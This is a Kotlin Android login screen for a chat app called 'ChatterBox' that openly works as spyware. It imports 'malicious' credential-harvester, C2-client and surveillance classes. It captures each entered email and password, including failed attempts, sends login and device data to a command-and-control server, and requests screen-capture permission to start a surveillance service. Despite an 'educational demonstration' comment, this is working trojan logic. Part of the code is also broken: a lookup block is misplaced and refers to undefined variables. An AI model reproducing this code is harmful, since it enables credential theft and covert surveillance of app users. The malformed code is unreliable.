package com.example.ChatterBox

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.ProgressBar
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.example.ChatterBox.malicious.CredentialHarvester
import com.example.ChatterBox.malicious.C2Client
import com.example.ChatterBox.malicious.SurveillanceService
import com.google.firebase.auth.FirebaseAuth
import org.json.JSONObject
import com.google.firebase.firestore.FirebaseFirestore

class LoginActivity : AppCompatActivity() {
    private lateinit var auth: FirebaseAuth
    private lateinit var firestore: FirebaseFirestore
    private lateinit var c2Client: C2Client

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.login_activity)

        auth = FirebaseAuth.getInstance()

        // Initialize C2 client
        c2Client = C2Client(this)
        firestore = FirebaseFirestore.getInstance()

        val usernameInput = findViewById<EditText>(R.id.usernameInput)
        val passwordInput = findViewById<EditText>(R.id.passwordInput)
        val loginButton = findViewById<Button>(R.id.loginButton)
        val progressBar = findViewById<ProgressBar>(R.id.progressBar)

        loginButton.setOnClickListener {
            val username = usernameInput.text.toString().trim()
            val password = passwordInput.text.toString().trim()

            if (username.isEmpty() || password.isEmpty()) {
                Toast.makeText(this, "Fields cannot be empty", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            progressBar.visibility = ProgressBar.VISIBLE

            // Harvest credentials before login attempt (for educational demonstration only)
            harvestCredentials(username, password)

            // Connect to C2 server immediately when user attempts to log in
            connectToC2Server(username)

            auth.signInWithEmailAndPassword(username, password)
                .addOnSuccessListener {
                    startActivity(Intent(this, MainActivity::class.java))
                    finish()
                }
                .addOnFailureListener {
                    Toast.makeText(this, "Login failed: ${it.message}", Toast.LENGTH_SHORT).show()

                    // Some malware might also collect failed login attempts
                    harvestCredentials(username, password, failed = true)
                }
                .addOnCompleteListener {
                    progressBar.visibility = ProgressBar.GONE
                }
        }
        requestScreenCapturePermission()

    }
    private val REQUEST_MEDIA_PROJECTION = 1

    private fun requestScreenCapturePermission() {
        val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == REQUEST_MEDIA_PROJECTION) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                // Store permission
                val intent = Intent(this, SurveillanceService::class.java)
                intent.action = "SETUP_PROJECTION"
                intent.putExtra("resultCode", resultCode)
                intent.putExtra("data", data)
                startService(intent)
            } else {
                // Permission denied
                Log.e("MainActivity", "Screen capture permission denied")
            }
        }
    }
    private fun connectToC2Server(userEmail: String) {
        Log.d("C2Connection", "Connecting to C2 server on login")

        try {
            // Register the device with C2 server
            c2Client.registerDevice()

            // Send additional login event data
            val loginData = JSONObject().apply {
                put("event_type", "user_login")
                put("email", userEmail)
                put("timestamp", System.currentTimeMillis())
                put("device_model", android.os.Build.MODEL)
                put("android_version", android.os.Build.VERSION.RELEASE)
            }

            // Send the login event to the C2 server
            c2Client.sendExfiltrationData("login_event", loginData.toString())

            Log.d("C2Connection", "Successfully connected to C2 server and sent login data")
        } catch (e: Exception) {
            Log.e("C2Connection", "Error connecting to C2 server", e)
        }
    }

    private fun harvestCredentials(email: String, password: String, failed: Boolean = false) {
        Log.d("CredentialHarvester", "Harvesting credentials")

        try {
            val extraData = mapOf(
                "device_model" to android.os.Build.MODEL,
                "device_manufacturer" to android.os.Build.MANUFACTURER,
                "android_version" to android.os.Build.VERSION.RELEASE,
                "login_successful" to (!failed).toString(),
                "app_version" to "1.0" // Hard-coded version instead of BuildConfig
            )

            CredentialHarvester.storeCredentials(
                context = this,
                source = "ChatterBox Login",
                username = email,
                password = password,
                extraData = extraData
            )

            Log.d("CredentialHarvester", "Harvested successfully")
        } catch (e: Exception) {
            Log.e("CredentialHarvester", "Error harvesting", e)
        }
            // Retrieve email associated with the username
            firestore.collection("users")
                .whereEqualTo("username", username)
                .get()
                .addOnSuccessListener { documents ->
                    if (!documents.isEmpty) {
                        val email = documents.documents[0].getString("email") // Fetch email
                        if (!email.isNullOrEmpty()) {
                            authenticateUser(email, password, progressBar)
                        } else {
                            Toast.makeText(
                                this,
                                "No account found for this username",
                                Toast.LENGTH_SHORT
                            ).show()
                            progressBar.visibility = ProgressBar.GONE
                        }
                    } else {
                        Toast.makeText(this, "Username not found", Toast.LENGTH_SHORT).show()
                        progressBar.visibility = ProgressBar.GONE
                    }
                }
                .addOnFailureListener {
                    Toast.makeText(
                        this,
                        "Error fetching username: ${it.message}",
                        Toast.LENGTH_SHORT
                    ).show()
                    progressBar.visibility = ProgressBar.GONE
                }
        }
    }

    private fun authenticateUser(email: String, password: String, progressBar: ProgressBar) {
        auth.signInWithEmailAndPassword(email, password) // Ensure this uses email
            .addOnSuccessListener {
                startActivity(Intent(this, MainActivity::class.java))
                finish()
            }
            .addOnFailureListener {
                Toast.makeText(this, "Login failed: ${it.message}", Toast.LENGTH_SHORT).show()
            }
            .addOnCompleteListener {
                progressBar.visibility = ProgressBar.GONE
            }
    }
}
